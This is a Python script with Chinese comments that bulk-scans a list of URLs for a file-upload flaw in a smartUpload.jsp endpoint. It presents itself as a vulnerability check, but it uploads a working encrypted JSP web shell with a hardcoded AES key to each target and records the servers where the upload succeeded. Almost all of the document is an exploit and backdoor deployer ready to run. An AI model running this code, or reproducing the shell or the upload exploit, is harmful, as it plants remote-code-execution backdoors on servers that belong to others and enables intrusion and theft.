import requests
import re
import urllib3
from urllib.parse import urljoin
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 创建线程锁用于安全写入文件
file_lock = threading.Lock()

def check_vulnerability(url):
    """
    检测目标URL是否存在smartUpload.jsp文件上传漏洞
    """
    try:
        # 构造完整的URL
        target_url = urljoin(url, "/defaultroot/extension/smartUpload.jsp")
        params = {
            "path": "information",
            "mode": "add",
            "fileName": "infoPicName",
            "saveName": "infoPicSaveName",
            "tableName": "infoPicTable",
            "fileMaxSize": "0",
            "fileMaxNum": "0",
            "fileType": "gif,jpg,bmp,jsp,png",
            "fileMinWidth": "0",
            "fileMinHeight": "0",
            "fileMaxWidth": "0",
            "fileMaxHeight": "0"
        }
        
        # 构造multipart/form-data数据
        boundary = "----WebKitFormBoundarynNQ8hoU56tfSwBVU"
        
        # 构造请求体
        jsp_shell = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'
        
        data = f"""--{boundary}
Content-Disposition: form-data; name="photo"; filename="shell.jsp"
Content-Type: application/octet-stream

{jsp_shell}
--{boundary}
Content-Disposition: form-data; name="continueUpload"

1
--{boundary}
Content-Disposition: form-data; name="submit"

上传继续
--{boundary}--"""
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Connection": "close",
            "Cookie": "JSESSIONID=PjXnh6bLTzy0ygQf41vWctGPLGkSvkJ6J1yS3ppzJmCvVFQZgm1r!1156443419"
        }
        
        # 发送POST请求
        response = requests.post(
            target_url,
            params=params,
            data=data.encode('utf-8'),
            headers=headers,
            verify=False,
            timeout=10
        )
        
        # 检查响应状态码
        if response.status_code == 200:
            # 使用正则表达式匹配25位数字+.jsp的文件名
            pattern = r'\d{25}\.jsp'
            match = re.search(pattern, response.text)
            
            if match:
                filename = match.group()
                result_msg = f"[+] 漏洞存在! URL: {url}, 上传的文件名: {filename}"
                print(result_msg)
                
                # 使用线程锁安全地写入文件
                with file_lock:
                    with open("result.txt", "a", encoding="utf-8") as f:
                        f.write(f"URL: {url}\n")
                        f.write(f"上传的文件: {filename}\n")
                        f.write(f"响应长度: {len(response.text)}\n")
                        f.write("-" * 50 + "\n")
                
                return True, url, filename
            else:
                print(f"[-] {url} - 响应状态码200，但未找到预期的文件名模式")
                return False, url, None
        else:
            print(f"[-] {url} - 响应状态码: {response.status_code}")
            return False, url, None
            
    except requests.exceptions.RequestException as e:
        print(f"[-] {url} - 请求失败: {e}")
        return False, url, None
    except Exception as e:
        print(f"[-] {url} - 发生错误: {e}")
        return False, url, None

def main():
    """
    主函数
    """
    try:
        # 读取url.txt文件
        with open("url.txt", "r", encoding="utf-8") as f:
            urls = [line.strip() for line in f.readlines() if line.strip()]
        
        if not urls:
            print("[-] url.txt文件中没有找到有效的URL")
            return
        
        print(f"[*] 共找到 {len(urls)} 个URL需要检测")
        print("[*] 开始并发漏洞检测，线程数: 30")
        print("[*] 正在检测，请稍候...")
        
        vulnerable_count = 0
        vulnerable_urls = []
        
        # 使用线程池并发执行，最大线程数为30
        with ThreadPoolExecutor(max_workers=30) as executor:
            # 提交所有任务
            future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
            
            # 处理完成的任务
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result, checked_url, filename = future.result()
                    if result:
                        vulnerable_count += 1
                        vulnerable_urls.append((checked_url, filename))
                except Exception as e:
                    print(f"[-] {url} - 任务执行异常: {e}")
        
        # 输出最终统计结果
        print(f"\n[*] 检测完成!")
        print(f"[*] 总共检测: {len(urls)} 个URL")
        print(f"[*] 存在漏洞: {vulnerable_count} 个")
        
        if vulnerable_count > 0:
            print(f"[*] 存在漏洞的URL:")
            for url, filename in vulnerable_urls:
                print(f"    - {url} (文件: {filename})")
        
        print(f"[*] 结果已保存到: result.txt")
        
    except FileNotFoundError:
        print("[-] 找不到url.txt文件")
        print("[*] 请创建url.txt文件，每行一个URL")
    except Exception as e:
        print(f"[-] 程序执行错误: {e}")

if __name__ == "__main__":
    main()